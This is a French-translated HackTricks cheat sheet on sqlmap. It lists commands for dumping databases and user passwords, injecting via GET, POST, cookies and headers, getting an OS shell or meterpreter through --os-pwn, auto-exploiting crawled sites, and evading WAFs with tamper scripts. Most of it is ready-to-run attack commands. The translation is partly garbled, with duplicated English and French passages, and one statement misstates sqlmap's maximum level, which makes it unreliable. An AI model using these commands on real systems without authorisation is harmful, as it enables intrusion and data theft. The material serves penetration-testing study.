<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Arguments de base pour SQLmap

## G√©n√©rique
```bash
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY
```
## R√©cup√©rer des informations

### Interne
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
```
### Donn√©es de la base de donn√©es
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
# Emplacement de l'injection

## √Ä partir de la capture Burp/ZAP

Capturez la requ√™te et cr√©ez un fichier req.txt.
```bash
sqlmap -r req.txt --current-user
```
## Injection de requ√™te GET

### Basic Usage

### Utilisation de base

```
sqlmap -u "http://www.target.com/vuln.php?id=1" --dbms=mysql --level=5 --risk=3 --batch --threads=5
```

### Description

### Description

L'injection de requ√™te GET est une technique d'injection SQL qui exploite les vuln√©rabilit√©s des param√®tres de requ√™te GET d'une application Web. Cette technique est similaire √† l'injection de requ√™te POST, mais elle cible les param√®tres de requ√™te GET.

Lorsqu'un utilisateur soumet une requ√™te GET, les param√®tres de la requ√™te sont inclus dans l'URL. Par exemple, dans l'URL suivante :

```
http://www.example.com/search.php?query=example
```

Le param√®tre de requ√™te est `query` et sa valeur est `example`.

L'injection de requ√™te GET peut √™tre utilis√©e pour extraire des informations sensibles de la base de donn√©es de l'application Web, telles que des noms d'utilisateur, des mots de passe et des donn√©es personnelles. Elle peut √©galement √™tre utilis√©e pour modifier les donn√©es de la base de donn√©es ou pour ex√©cuter des commandes √† distance sur le serveur.

### Exemple

Consid√©rons l'URL suivante :

```
http://www.example.com/vuln.php?id=1
```

Nous pouvons utiliser sqlmap pour tester si le param√®tre `id` est vuln√©rable √† une injection de requ√™te GET :

```
sqlmap -u "http://www.example.com/vuln.php?id=1" --dbms=mysql --level=5 --risk=3 --batch --threads=5
```

Si le param√®tre `id` est vuln√©rable, sqlmap affichera les informations de la base de donn√©es et les donn√©es sensibles qu'il a pu extraire.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
## Injection de requ√™te POST

---

### Basic POST Request Injection

### Injection de requ√™te POST basique

---

#### Example

#### Exemple

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

username=admin&password=1234
```

---

#### SQLMap Command

#### Commande SQLMap

```
sqlmap -u "http://example.com/login" --data "username=admin&password=1234" --method POST
```

---

#### Explanation

#### Explication

In a POST request, the parameters are sent in the body of the request, instead of in the URL. To perform a POST request injection, we need to use the `--data` option in SQLMap to specify the parameters that we want to inject.

Dans une requ√™te POST, les param√®tres sont envoy√©s dans le corps de la requ√™te, plut√¥t que dans l'URL. Pour effectuer une injection de requ√™te POST, nous devons utiliser l'option `--data` dans SQLMap pour sp√©cifier les param√®tres que nous voulons injecter. 

--- 

#### Additional Options

#### Options suppl√©mentaires

- `--method`: specifies the HTTP method to use (default is `GET`)
- `--cookie`: specifies the cookie to use for authentication
- `--proxy`: specifies the proxy to use for requests

- `--method`: sp√©cifie la m√©thode HTTP √† utiliser (par d√©faut, c'est `GET`)
- `--cookie`: sp√©cifie le cookie √† utiliser pour l'authentification
- `--proxy`: sp√©cifie le proxy √† utiliser pour les requ√™tes
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
## Injections dans les en-t√™tes et autres m√©thodes HTTP

### Injection in Headers

### Injection dans les en-t√™tes

Headers can also be vulnerable to injection attacks, especially when they are used to transmit sensitive information such as authentication tokens or session IDs. In some cases, headers can also be used to bypass security controls or to perform other malicious actions.

Les en-t√™tes peuvent √©galement √™tre vuln√©rables aux attaques d'injection, en particulier lorsqu'ils sont utilis√©s pour transmettre des informations sensibles telles que des jetons d'authentification ou des identifiants de session. Dans certains cas, les en-t√™tes peuvent √©galement √™tre utilis√©s pour contourner les contr√¥les de s√©curit√© ou pour effectuer d'autres actions malveillantes.

To test for injection vulnerabilities in headers, you can use the `--headers` option in sqlmap. This option allows you to specify custom headers to be sent with the request, which can be used to inject payloads into the headers.

Pour tester les vuln√©rabilit√©s d'injection dans les en-t√™tes, vous pouvez utiliser l'option `--headers` dans sqlmap. Cette option vous permet de sp√©cifier des en-t√™tes personnalis√©s √† envoyer avec la requ√™te, ce qui peut √™tre utilis√© pour injecter des charges utiles dans les en-t√™tes.

For example, the following command tests for injection vulnerabilities in the `Authorization` header:

Par exemple, la commande suivante teste les vuln√©rabilit√©s d'injection dans l'en-t√™te `Authorization` :

```
sqlmap -r request.txt --headers="Authorization: <injection_payload>"
```

### Injection in other HTTP Methods

### Injection dans d'autres m√©thodes HTTP

In addition to GET and POST requests, other HTTP methods such as PUT, DELETE, and OPTIONS can also be vulnerable to injection attacks. These methods are often used in REST APIs to create, update, or delete resources.

En plus des requ√™tes GET et POST, d'autres m√©thodes HTTP telles que PUT, DELETE et OPTIONS peuvent √©galement √™tre vuln√©rables aux attaques d'injection. Ces m√©thodes sont souvent utilis√©es dans les API REST pour cr√©er, mettre √† jour ou supprimer des ressources.

To test for injection vulnerabilities in these methods, you can use the `--method` option in sqlmap. This option allows you to specify the HTTP method to be used in the request.

Pour tester les vuln√©rabilit√©s d'injection dans ces m√©thodes, vous pouvez utiliser l'option `--method` dans sqlmap. Cette option vous permet de sp√©cifier la m√©thode HTTP √† utiliser dans la requ√™te.

For example, the following command tests for injection vulnerabilities in a PUT request:

Par exemple, la commande suivante teste les vuln√©rabilit√©s d'injection dans une requ√™te PUT :

```
sqlmap -r request.txt --method=PUT
```
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
## Injection de second ordre
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
## Shell

## Coquille
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
## Parcourir un site web avec SQLmap et auto-exploiter

SQLmap est un outil puissant pour l'exploitation de vuln√©rabilit√©s de type injection SQL. Il peut √™tre utilis√© pour parcourir un site web √† la recherche de vuln√©rabilit√©s et les exploiter automatiquement.

Pour parcourir un site web avec SQLmap, vous pouvez utiliser la commande suivante :

```
sqlmap -u <URL> --crawl=1
```

Cela permettra √† SQLmap de parcourir le site web et de collecter des informations sur les param√®tres de l'URL et les formulaires. Si SQLmap d√©tecte une vuln√©rabilit√© d'injection SQL, il vous demandera si vous souhaitez l'exploiter automatiquement.

Il est important de noter que l'exploitation automatique peut √™tre dangereuse car elle peut causer des dommages au site web. Il est recommand√© d'utiliser l'option `--level` pour sp√©cifier le niveau de risque que vous √™tes pr√™t √† prendre. Par exemple, `--level=3` est le niveau de risque le plus √©lev√© et peut causer des dommages importants au site web.

En utilisant SQLmap avec pr√©caution, vous pouvez parcourir un site web √† la recherche de vuln√©rabilit√©s d'injection SQL et les exploiter automatiquement pour obtenir des informations sensibles.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
# Personnalisation de l'injection

## Ajouter un suffixe
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
## Pr√©fixe
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
## Aide pour trouver une injection bool√©enne
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
## Alt√©ration
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper | Description |
| :--- | :--- |
| apostrophemask.py | Remplace le caract√®re apostrophe par son homologue UTF-8 pleine largeur |
| apostrophenullencode.py | Remplace le caract√®re apostrophe par son homologue double unicode ill√©gal |
| appendnullbyte.py | Ajoute un octet NULL encod√© √† la fin de la charge utile |
| base64encode.py | Encode en base64 tous les caract√®res d'une charge utile donn√©e |
| between.py | Remplace l'op√©rateur sup√©rieur √† \('&gt;'\) par 'NOT BETWEEN 0 AND \#' |
| bluecoat.py | Remplace l'espace apr√®s l'instruction SQL par un caract√®re blanc al√©atoire valide. Ensuite, remplace le caract√®re = par l'op√©rateur LIKE |
| chardoubleencode.py | Encode en double URL tous les caract√®res d'une charge utile donn√©e \(sans traiter ceux d√©j√† encod√©s\) |
| commalesslimit.py | Remplace les occurrences telles que 'LIMIT M, N' par 'LIMIT N OFFSET M' |
| commalessmid.py | Remplace les occurrences telles que 'MID\(A, B, C\)' par 'MID\(A FROM B FOR C\)' |
| concat2concatws.py | Remplace les occurrences telles que 'CONCAT\(A, B\)' par 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| charencode.py | Encode en URL tous les caract√®res d'une charge utile donn√©e \(sans traiter ceux d√©j√† encod√©s\) |
| charunicodeencode.py | Encode en Unicode-URL les caract√®res non encod√©s d'une charge utile donn√©e \(sans traiter ceux d√©j√† encod√©s\). "%u0022" |
| charunicodeescape.py | Encode en Unicode-URL les caract√®res non encod√©s d'une charge utile donn√©e \(sans traiter ceux d√©j√† encod√©s\). "\u0022" |
| equaltolike.py | Remplace toutes les occurrences de l'op√©rateur √©gal \('='\) par l'op√©rateur 'LIKE' |
| escapequotes.py | √âchappe les guillemets \(' and "\) |
| greatest.py | Remplace l'op√©rateur sup√©rieur √† \('&gt;'\) par son homologue GREATEST |
| halfversionedmorekeywords.py | Ajoute un commentaire MySQL versionn√© avant chaque mot-cl√© |
| ifnull2ifisnull.py | Remplace les occurrences telles que 'IFNULL\(A, B\)' par 'IF\(ISNULL\(A\), B, A\)' |
| modsecurityversioned.py | Encadre la requ√™te compl√®te avec un commentaire versionn√© |
| modsecurityzeroversioned.py | Encadre la requ√™te compl√®te avec un commentaire de version z√©ro |
| multiplespaces.py | Ajoute plusieurs espaces autour des mots-cl√©s SQL |
| nonrecursivereplacement.py | Remplace les mots-cl√©s SQL pr√©d√©finis par des repr√©sentations adapt√©es au remplacement \(par exemple, .replace\("SELECT", ""\)\) filtres |
| percentage.py | Ajoute un signe de pourcentage \('%'\) devant chaque caract√®re |
| overlongutf8.py | Convertit tous les caract√®res d'une charge utile donn√©e \(sans traiter ceux d√©j√† encod√©s\) |
| randomcase.py | Remplace chaque caract√®re de mot-cl√© par une valeur de cas al√©atoire |
| randomcomments.py | Ajoute des commentaires al√©atoires aux mots-cl√©s SQL |
| securesphere.py | Ajoute une cha√Æne sp√©cialement con√ßue |
| sp\_password.py | Ajoute 'sp\_password' √† la fin de la charge utile pour l'obfuscation automatique des journaux DBMS |
| space2comment.py | Remplace l'espace \(' '\) par des commentaires |
| space2dash.py | Remplace l'espace \(' '\) par un commentaire de tiret \('--'\) suivi d'une cha√Æne al√©atoire et d'une nouvelle ligne \('\n'\) |
| space2hash.py | Remplace l'espace \(' '\) par un caract√®re di√®se \('\#'\) suivi d'une cha√Æne al√©atoire et d'une nouvelle ligne \('\n'\) |
| space2morehash.py | Remplace l'espace \(' '\) par un caract√®re di√®se \('\#'\) suivi d'une cha√Æne al√©atoire et d'une nouvelle ligne \('\n'\) |
| space2mssqlblank.py | Remplace l'espace \(' '\) par un caract√®re blanc al√©atoire √† partir d'un ensemble valide de caract√®res alternatifs |
| space2mssqlhash.py | Remplace l'espace \(' '\) par un caract√®re di√®se \('\#'\) suivi d'une nouvelle ligne \('\n'\) |
| space2mysqlblank.py | Remplace l'espace \(' '\) par un caract√®re blanc al√©atoire √† partir d'un ensemble valide de caract√®res alternatifs |
| space2mysqldash.py | Remplace l'espace \(' '\) par un commentaire de tiret \('--'\) suivi d'une nouvelle ligne \('\n'\) |
| space2plus.py | Remplace l'espace \(' '\) par un signe plus \('+'\) |
| space2randomblank.py | Remplace l'espace \(' '\) par un caract√®re blanc al√©atoire √† partir d'un ensemble valide de caract√®res alternatifs |
| symboliclogical.py | Remplace les op√©rateurs logiques AND et OR par leurs homologues symboliques \(&& et |
| unionalltounion.py | Remplace UNION ALL SELECT par UNION SELECT |
| unmagicquotes.py | Remplace le caract√®re de citation \('\) par une combinaison multioctet %bf%27 avec un commentaire g√©n√©rique √† la fin \(pour le faire fonctionner\) |
| uppercase.py | Remplace chaque caract√®re de mot-cl√© par une valeur en majuscule 'INSERT' |
| varnish.py | Ajoute un en-t√™te HTTP 'X-originating-IP' |
| versionedkeywords.py | Encadre chaque mot-cl√© non fonctionnel avec un commentaire MySQL versionn√© |
| versionedmorekeywords.py | Encadre chaque mot-cl√© avec un commentaire MySQL versionn√© |
| xforwardedfor.py | Ajoute un faux en-t√™te HTTP 'X-Forwarded-For' |
